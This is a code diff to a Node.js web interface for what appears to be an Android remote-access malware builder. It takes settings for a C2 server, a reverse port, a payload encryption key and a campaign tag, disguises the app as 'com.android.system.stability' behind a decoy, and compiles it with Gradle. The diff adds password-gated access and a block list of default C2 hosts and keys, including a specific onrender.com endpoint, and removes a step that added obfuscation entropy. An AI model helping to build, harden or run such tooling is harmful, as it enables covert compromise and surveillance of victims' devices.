@@ -1,12 +1,30 @@
 const http = require('http');
 const fs = require('fs');
 const path = require('path');
+const crypto = require('crypto');
 const { exec } = require('child_process');
 
 const PORT = 8000;
 const SCRIPT_DIR = __dirname;
 const PROJECT_DIR = path.dirname(SCRIPT_DIR);
 const OUTPUT_DIR = path.join(SCRIPT_DIR, 'output');
+
+// --- BUILD_PASSWORD: env override, otherwise random per launch and printed once ---
+const BUILD_PASSWORD = process.env.BUILD_PASSWORD || crypto.randomBytes(12).toString('hex');
+// In-memory session tokens issued by /auth (browser holds them, never the password)
+const SESSION_TOKENS = new Set();
+const TOKEN_TTL_MS = 60 * 60 * 1000; // 60 minutes
+// Values that are never acceptable for C2 host or encryption key
+const BLOCKED_VALUES = new Set(['', 'AndroidKernel1337', 'TacticalKey2026SecureGCM', 'admin1337',
+    'https://lab-rats-v1-6.onrender.com', 'http://lab-rats-v1-6.onrender.com', 'lab-rats-v1-6.onrender.com']);
+
+function isAuthorized(req) {
+    const header = req.headers['x-build-token'];
+    const url = new URL(req.url, 'http://127.0.0.1');
+    const query = url.searchParams.get('token');
+    const candidate = header || query || '';
+    return candidate.length > 0 && SESSION_TOKENS.has(candidate);
+}
 
 if (!fs.existsSync(OUTPUT_DIR)) {
     fs.mkdirSync(OUTPUT_DIR, { recursive: true });
@@ -100,9 +118,9 @@ const HTML_PAGE = `<!DOCTYPE html>
                     <div class="card-box">
                         <div class="card-box-title">C2 Server & Encryption Settings</div>
                         <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 10px;">
-                            <div class="field-group"><label>C2 Server Endpoint / Webhook URL</label><input type="text" id="cfg-host" value="https://lab-rats-v1-6.onrender.com"></div>
+                            <div class="field-group"><label>C2 Server Endpoint / Webhook URL (REQUIRED)</label><input type="text" id="cfg-host" value="" placeholder="https://your-c2.example.com"></div>
                             <div class="field-group"><label>C2 Reverse Listening Port</label><input type="text" id="cfg-port" value="9191"></div>
-                            <div class="field-group"><label>AES-256 Payload Encryption Key</label><input type="text" id="cfg-key" value="TacticalKey2026SecureGCM"></div>
+                            <div class="field-group"><label>AES-256 Payload Encryption Key</label><input type="text" id="cfg-key" value="" placeholder="blank = auto-generated"></div>
                             <div class="field-group"><label>Campaign ID / Target Tag</label><input type="text" id="cfg-campaign" value="OPERATION_NIGHTHAWK"></div>
                         </div>
                     </div>
@@ -222,6 +240,10 @@ const HTML_PAGE = `<!DOCTYPE html>
                 <div id="tab-build" class="panel">
                     <div class="card-box" style="text-align: center; padding: 35px;">
                         <div class="card-box-title">Compilation & Packaging</div>
+                        <div style="display: flex; justify-content: center; align-items: center; gap: 10px; margin-bottom: 25px; flex-wrap: wrap;">
+                            <input type="password" id="build-pass" placeholder="BUILD_PASSWORD (printed in server console)" style="background:#000; border:1px solid var(--neon-cyan); color:#fff; padding:10px 14px; border-radius:8px; font-family:'JetBrains Mono', monospace; font-size:0.8rem; width:320px; max-width:80%; outline:none;">
+                            <button class="btn-action" style="padding:10px 22px; font-size:0.75rem; margin:0;" onclick="unlockBuilder()">UNLOCK</button>
+                        </div>
                         <button id="btn-build" class="btn-action" onclick="runBuildPipeline()" style="margin-bottom: 25px;">GENERATE TACTICAL APK</button>
                         <div id="progress-bar-wrap" style="width: 100%; height: 10px; background: #000; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 20px; display: none; overflow: hidden;">
                             <div id="progress-bar" style="width: 0%; height: 100%; background: var(--neon-cyan); box-shadow: 0 0 15px var(--neon-cyan); transition: width 0.3s;"></div>
@@ -267,12 +289,50 @@ const HTML_PAGE = `<!DOCTYPE html>
             if (targetPanel) targetPanel.classList.add('active');
         }
 
+        let buildToken = null;
+        const BLOCKED = ['', 'AndroidKernel1337', 'TacticalKey2026SecureGCM', 'admin1337',
+            'https://lab-rats-v1-6.onrender.com', 'http://lab-rats-v1-6.onrender.com', 'lab-rats-v1-6.onrender.com'];
+
+        async function unlockBuilder() {
+            const pass = document.getElementById('build-pass').value;
+            const term = document.getElementById('term');
+            if (!pass) { term.innerHTML += '> AUTH_FAILED: Enter the BUILD_PASSWORD printed in the server console\\n'; return; }
+            const r = await fetch('/auth', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ password: pass })
+            });
+            const d = await r.json();
+            if (d.success && d.token) {
+                buildToken = d.token;
+                term.innerHTML += '> AUTH_OK: Builder unlocked for this session.\\n';
+            } else {
+                buildToken = null;
+                term.innerHTML += '> AUTH_FAILED: Wrong BUILD_PASSWORD.\\n';
+            }
+        }
+
         function runBuildPipeline() {
             const btn = document.getElementById('btn-build');
             const barWrap = document.getElementById('progress-bar-wrap');
             const bar = document.getElementById('progress-bar');
             const term = document.getElementById('term');
             const dlWrap = document.getElementById('dl-wrap');
+
+            if (!buildToken) {
+                term.innerHTML += '> BUILD_REJECTED: Enter BUILD_PASSWORD and press UNLOCK first.\\n';
+                return;
+            }
+
+            const c2Host = document.getElementById('cfg-host').value.trim();
+            if (!c2Host) {
+                term.innerHTML += '> BUILD_REJECTED: C2 Server Endpoint is REQUIRED (empty value is rejected).\\n';
+                return;
+            }
+            if (BLOCKED.includes(c2Host)) {
+                term.innerHTML += '> BUILD_REJECTED: C2 endpoint matches a blocked default value. Use your own host.\\n';
+                return;
+            }
 
             btn.disabled = true; btn.style.opacity = '0.5';
             barWrap.style.display = 'block'; dlWrap.style.display = 'none';
@@ -282,7 +342,8 @@ const HTML_PAGE = `<!DOCTYPE html>
             const configData = {
                 appName: document.getElementById('cfg-app-name').value,
                 pkgName: 'com.android.system.stability',
-                c2Host: document.getElementById('cfg-host').value,
+                c2Host: c2Host,
+                encKey: document.getElementById('cfg-key').value.trim(),
                 c2Port: document.getElementById('cfg-port').value,
                 decoyChoice: document.getElementById('cfg-decoy-preset').value,
                 decoyName: document.getElementById('cfg-decoy-name').value,
@@ -293,7 +354,7 @@ const HTML_PAGE = `<!DOCTYPE html>
 
             fetch('/build', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: { 'Content-Type': 'application/json', 'x-build-token': buildToken },
                 body: JSON.stringify(configData)
             })
             .then(r => r.json())
@@ -303,7 +364,7 @@ const HTML_PAGE = `<!DOCTYPE html>
                     term.innerHTML += '> Local Gradle Build Completed!\\n> Output: apk-builder/output/app-release-signed.apk\\n> STATUS: BUILD_SUCCESS\\n';
                     btn.disabled = false; btn.style.opacity = '1';
                     dlWrap.style.display = 'block';
-                    document.getElementById('dl-btn').href = d.downloadUrl;
+                    document.getElementById('dl-btn').href = d.downloadUrl + '?token=' + encodeURIComponent(buildToken);
                 } else {
                     term.innerHTML += '> BUILD_FAILED: ' + (d.error || 'Unknown error') + '\\n';
                     btn.disabled = false; btn.style.opacity = '1';
@@ -316,7 +377,7 @@ const HTML_PAGE = `<!DOCTYPE html>
         }
 
         function pollDeviceTelemetry() {
-            fetch('/api/device-stats')
+            fetch('/api/device-stats', { headers: { 'x-build-token': buildToken || '' } })
                 .then(r => r.json())
                 .then(d => {
                     const badge = document.getElementById('hud-status-badge');
@@ -395,12 +456,43 @@ const server = http.createServer((req, res) => {
     if (req.url === '/' || req.url.startsWith('/builder')) {
         res.writeHead(200, { 'Content-Type': 'text/html' });
         res.end(HTML_PAGE);
+    } else if (req.url === '/auth' && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => { body += chunk; });
+        req.on('end', () => {
+            try {
+                const data = JSON.parse(body || '{}');
+                if (data.password && data.password === BUILD_PASSWORD) {
+                    const token = crypto.randomBytes(16).toString('hex');
+                    SESSION_TOKENS.add(token);
+                    setTimeout(() => SESSION_TOKENS.delete(token), TOKEN_TTL_MS);
+                    res.writeHead(200, { 'Content-Type': 'application/json' });
+                    res.end(JSON.stringify({ success: true, token }));
+                } else {
+                    res.writeHead(401, { 'Content-Type': 'application/json' });
+                    res.end(JSON.stringify({ success: false }));
+                }
+            } catch (err) {
+                res.writeHead(400, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: false, error: err.message }));
+            }
+        });
     } else if (req.url === '/api/device-stats') {
+        if (!isAuthorized(req)) {
+            res.writeHead(401, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ connected: false, error: 'UNAUTHORIZED' }));
+            return;
+        }
         getConnectedAdbDevice(deviceData => {
             res.writeHead(200, { 'Content-Type': 'application/json' });
             res.end(JSON.stringify(deviceData));
         });
     } else if (req.url === '/build' && req.method === 'POST') {
+        if (!isAuthorized(req)) {
+            res.writeHead(401, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: false, error: 'UNAUTHORIZED: unlock with BUILD_PASSWORD first' }));
+            return;
+        }
         let body = '';
         req.on('data', chunk => { body += chunk; });
         req.on('end', () => {
@@ -408,9 +500,26 @@ const server = http.createServer((req, res) => {
                 const data = JSON.parse(body || '{}');
                 const appName = data.appName || 'connection';
                 const pkgName = data.pkgName || 'com.android.system.stability';
-                const c2Host = data.c2Host || 'https://lab-rats-v1-6.onrender.com';
-                const encKey = data.encKey || 'TacticalKey2026SecureGCM';
+                const c2Host = (data.c2Host || '').trim();
                 const decoyChoice = data.decoyChoice || '1';
+
+                // C2 host is REQUIRED and must not match any known/default value
+                if (BLOCKED_VALUES.has(c2Host)) {
+                    res.writeHead(400, { 'Content-Type': 'application/json' });
+                    res.end(JSON.stringify({ success: false, error: 'C2 host is empty or matches a blocked default value. Enter your own C2 endpoint.' }));
+                    return;
+                }
+
+                // Encryption key: empty -> auto-generate; blocked default -> reject
+                let encKey = (data.encKey || '').trim();
+                if (BLOCKED_VALUES.has(encKey)) {
+                    res.writeHead(400, { 'Content-Type': 'application/json' });
+                    res.end(JSON.stringify({ success: false, error: 'Encryption key is empty or matches a blocked default value.' }));
+                    return;
+                }
+                if (!encKey) {
+                    encKey = crypto.randomBytes(16).toString('base64').replace(/[^A-Za-z0-9]/g, '').slice(0, 24);
+                }
 
                 // 1. Update build_config.txt
                 const configPath = path.join(SCRIPT_DIR, 'build_config.txt');
@@ -453,18 +562,9 @@ const server = http.createServer((req, res) => {
                     fs.writeFileSync(stringsPath, st);
                 }
 
-                // 5. Generate random metadata files for obfuscation entropy
-                const sysDir = path.join(PROJECT_DIR, 'app', 'src', 'main', 'assets', 'sys');
-                if (!fs.existsSync(sysDir)) fs.mkdirSync(sysDir, { recursive: true });
-                for (let i = 1; i <= 3; i++) {
-                    const metaFile = path.join(sysDir, `metadata_${i}.dat`);
-                    const dummyBytes = Buffer.alloc(512);
-                    for (let b = 0; b < 512; b++) dummyBytes[b] = Math.floor(Math.random() * 256);
-                    fs.writeFileSync(metaFile, dummyBytes);
-                }
-
-                // 6. Execute local Gradle compilation
-                const gradleCmd = `cd "${PROJECT_DIR}" && ./gradlew assembleRelease --no-daemon`;
+                // 5. Execute local Gradle compilation (platform-aware wrapper)
+                const gradleWrapper = process.platform === 'win32' ? 'gradlew.bat' : './gradlew';
+                const gradleCmd = `cd "${PROJECT_DIR}" && ${gradleWrapper} assembleRelease --no-daemon`;
                 exec(gradleCmd, (error, stdout, stderr) => {
                     const outApk = path.join(OUTPUT_DIR, 'app-release-signed.apk');
                     const buildApk = path.join(PROJECT_DIR, 'app', 'build', 'outputs', 'apk', 'release', 'app-release-unsigned.apk');
@@ -509,7 +609,12 @@ const server = http.createServer((req, res) => {
         res.writeHead(404, { 'Content-Type': 'text/plain' });
         res.end('Image Not Found');
     } else if (req.url.startsWith('/output/')) {
-        const fileName = path.basename(req.url);
+        if (!isAuthorized(req)) {
+            res.writeHead(401, { 'Content-Type': 'text/plain' });
+            res.end('UNAUTHORIZED: unlock with BUILD_PASSWORD first');
+            return;
+        }
+        const fileName = path.basename(req.url.split('?')[0]);
         let filePath = path.join(OUTPUT_DIR, fileName);
         if (!fs.existsSync(filePath)) {
             filePath = path.join(PROJECT_DIR, 'app', 'build', 'outputs', 'apk', 'release', 'app-release-unsigned.apk');
@@ -531,12 +636,16 @@ const server = http.createServer((req, res) => {
     }
 });
 
-server.listen(PORT, '0.0.0.0', () => {
-    console.log(`\n [+] TACTICAL APK BUILDER GUI LAUNCHED`);
-    console.log(` [+] Local Web Interface: http://localhost:${PORT}`);
+server.listen(PORT, '127.0.0.1', () => {
+    console.log(`\n [+] TACTICAL APK BUILDER GUI LAUNCHED (localhost only)`);
+    console.log(` [+] Local Web Interface: http://127.0.0.1:${PORT}`);
+    console.log(` [+] BUILD_PASSWORD: ${BUILD_PASSWORD}`);
+    if (!process.env.BUILD_PASSWORD) {
+        console.log(` [+] (randomly generated for this launch; set env BUILD_PASSWORD to pin it)`);
+    }
     console.log(` [+] Opening default browser...\n`);
 
-    const url = `http://localhost:${PORT}`;
+    const url = `http://127.0.0.1:${PORT}`;
     const openCmd = process.platform === 'darwin' ? `open "${url}"` : (process.platform === 'win32' ? `start "${url}"` : `xdg-open "${url}"`);
     exec(openCmd);
 });
